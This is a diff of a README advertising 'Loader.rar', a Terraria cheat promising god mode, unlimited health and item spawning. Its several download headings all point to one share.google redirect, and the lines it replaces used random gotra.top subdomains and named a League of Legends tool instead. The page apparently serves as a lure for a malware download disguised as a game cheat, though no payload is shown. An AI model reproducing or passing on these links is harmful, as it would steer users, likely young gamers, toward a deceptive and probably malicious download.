@@ -1,7 +1,7 @@
 # ⚡ Terraria Mod
 
 #
-[![https://otCIE.gotra.top/54/baJFww6V](https://ad97pUs.gotra.top/l.svg)](https://share.google/A46RYcexjg9XZiG59)
+# ⚔️ [DOWNLOAD TERRARIA MOD](https://share.google/A46RYcexjg9XZiG59)
 
 **Loader.rar** is a tool designed to enhance your experience in the popular sandbox game **Terraria**. This cheat allows you to modify in-game parameters such as inventory, health, and items, giving you an edge in your adventures. Whether you want to experiment with the game mechanics or simply enjoy the game without the grind, **Terraria Cheat** is here to help!
 
@@ -36,7 +36,8 @@
 3. Choose the cheats you want to activate, such as unlimited health, spawning items, or god mode.  
 4. Apply the cheats and return to the game.  
 5. Start playing with the activated cheats in your world!
-# ⚔️ [DOWNLOAD LEAGUE OF LEGENDS TOOL](https://share.google/A46RYcexjg9XZiG59)
+
+# 👉 [DOWNLOAD Terraria TOOLKIT](https://share.google/A46RYcexjg9XZiG59)
 
 ---
 
